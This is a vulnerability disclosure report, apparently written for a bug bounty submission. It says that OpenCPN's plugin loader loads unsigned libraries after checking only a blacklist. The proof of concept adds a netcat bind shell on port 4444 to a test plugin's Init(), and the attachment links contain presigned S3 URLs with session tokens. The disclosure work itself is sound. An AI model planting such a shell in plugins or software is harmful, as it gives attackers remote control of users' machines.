---
notion_url: https://www.notion.so/76ebe08098308313956a81d9af926c10
last_synced: 2026-06-12 13:50
tags: [notion-sync]
---

# Code Injection

- 📄 [[KOR OpenCPN RCE - Code Injection/KOR OpenCPN RCE - Code Injection|KOR OpenCPN RCE - Code Injection]]

Vulnerability Title : OpenCPN RCE - Code Injection
Vulnerability Summary : Remote Code Execution arising from loading dynamically linked library files without signature, path, or whitelist validation
Vendor : GitHub OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Code Injection
Impact : Remote Code Execution with process privileges
Vulnerable Source File: `plugin_loader.cpp
`
Vulnerable Function: `PluginLoader::LoadPlugIn()`
Vulnerable Parameters : 

```c++
const wxString& plugin_file, PlugInContainer* pic
```

Affected Environment : Ubuntu 24.04

Proof Of Concept  : 
During the library load process, only blacklist-based validation is performed:

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

Using the OpenCPN TestPlugin template from GitHub for an example RCE via a bind shell:
https://github.com/jongough/testplugin_pi.git

Add the following at the very top of `src/testplugin_pi.cpp`’s `Init()`:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

After building and importing this plugin into OpenCPN:

![image](_assets/image.png)


You can connect to the shell via `nc`, demonstrating Remote Code Execution.

Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UWWDRWKJ%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T045012Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIBqY2%2BVx3bR58Pm69a%2B2DRANrmjncjR%2BbLtpNnMzyApFAiEAqHYVSAoo6dgaLMTCzGTA2zzWZuuF%2Bppak4uI2Kok9Ksq%2FwMIDRAAGgw2Mzc0MjMxODM4MDUiDJ4cHqGc9CRC7DUi%2FCrcA4n4eraLWi7xbmANJdn5DkVCQVrGDF4WhD7jcw7BPreygDFYZ2mzG0HwQ5TEi14j8tnscYcNmtIXoJBkn5VxfRvI9Y1mdA5kcrCh4toH2MATV5DJmykiJloOj6CVEURKaLYn%2BTbSfKAZovku26JlWBnB2pd8RV17Ejni9L7BygbGxeE3e8MC8O8XxzA%2BSbm8%2BHoSApT4Meuu1vtqTfZzFcFqnLZw%2FoD6fCWxvMndkNYHmR7BXInNkYJts0oqCaBQu2NQdP9CbnqidspiLsV2y0b0kX%2FDeGpmRHhGtDZ3%2BD3mL4vLw22QATwtGJuashrSgr9c5K857PNSgzgUDiO9q253qNAR7M4NxQ1CP0MiS9cUu8%2BpoFYQ5br2ibfsynBrk4yw8M%2BDS9MaiPvqyenUjZgr1x7lSFzA6rvgcy3z2TbV7pGACivNcQUBn1ct4paT%2FNuZoyPkE3hNBZ42DkyeiI6ICw7hkB118Q7rcq%2FMd0nwcMiXW3E%2BvMJxchxghrDpUl8A1PJ3K1ndRRa40jX6qKjxbrq%2FBvEHB6uhTY3xgEo8adxMdZTTzorMmYQ6GPz2ul1GrOevI7SO%2Fpej5b70mqNbXEDL2tgPp%2BpgyDqPzF%2Bcr%2Bw1DByPASzep5HOMMb6rdEGOqUBZpfkipKwoCYPfmP%2Fg2V2wxYKYiuDqZeReAqzWOgmEoga9Y4SSW1nwdkOPysaEzZwFnn%2FCVuh94pDGtd65YV5MAaKTJgXjHgkl4hltq6Jk9QXLA61Ti%2F57E5A7COwx2OJI4uMdnKZ5Ts622BusgDRmMFzRxJIflTBdMc5abGk6lU8rQaukwuKmJOekQAXZ%2BrJv8CNEdMzCxLb%2FzygCD6SxI%2BV6oDv&X-Amz-Signature=a00f10b8cd96c1b62ffc7728334491a0fb5f6864f2b5933df93ca5ccf9f53e72&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/6af31ca2-0d32-4cb4-8668-82a7bd93bf73/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UWWDRWKJ%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T045012Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIBqY2%2BVx3bR58Pm69a%2B2DRANrmjncjR%2BbLtpNnMzyApFAiEAqHYVSAoo6dgaLMTCzGTA2zzWZuuF%2Bppak4uI2Kok9Ksq%2FwMIDRAAGgw2Mzc0MjMxODM4MDUiDJ4cHqGc9CRC7DUi%2FCrcA4n4eraLWi7xbmANJdn5DkVCQVrGDF4WhD7jcw7BPreygDFYZ2mzG0HwQ5TEi14j8tnscYcNmtIXoJBkn5VxfRvI9Y1mdA5kcrCh4toH2MATV5DJmykiJloOj6CVEURKaLYn%2BTbSfKAZovku26JlWBnB2pd8RV17Ejni9L7BygbGxeE3e8MC8O8XxzA%2BSbm8%2BHoSApT4Meuu1vtqTfZzFcFqnLZw%2FoD6fCWxvMndkNYHmR7BXInNkYJts0oqCaBQu2NQdP9CbnqidspiLsV2y0b0kX%2FDeGpmRHhGtDZ3%2BD3mL4vLw22QATwtGJuashrSgr9c5K857PNSgzgUDiO9q253qNAR7M4NxQ1CP0MiS9cUu8%2BpoFYQ5br2ibfsynBrk4yw8M%2BDS9MaiPvqyenUjZgr1x7lSFzA6rvgcy3z2TbV7pGACivNcQUBn1ct4paT%2FNuZoyPkE3hNBZ42DkyeiI6ICw7hkB118Q7rcq%2FMd0nwcMiXW3E%2BvMJxchxghrDpUl8A1PJ3K1ndRRa40jX6qKjxbrq%2FBvEHB6uhTY3xgEo8adxMdZTTzorMmYQ6GPz2ul1GrOevI7SO%2Fpej5b70mqNbXEDL2tgPp%2BpgyDqPzF%2Bcr%2Bw1DByPASzep5HOMMb6rdEGOqUBZpfkipKwoCYPfmP%2Fg2V2wxYKYiuDqZeReAqzWOgmEoga9Y4SSW1nwdkOPysaEzZwFnn%2FCVuh94pDGtd65YV5MAaKTJgXjHgkl4hltq6Jk9QXLA61Ti%2F57E5A7COwx2OJI4uMdnKZ5Ts622BusgDRmMFzRxJIflTBdMc5abGk6lU8rQaukwuKmJOekQAXZ%2BrJv8CNEdMzCxLb%2FzygCD6SxI%2BV6oDv&X-Amz-Signature=29bf0e66581a43ba2889cf3f1893e221f0f93f69a6d6a153e7edf7a6fe3ae55b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
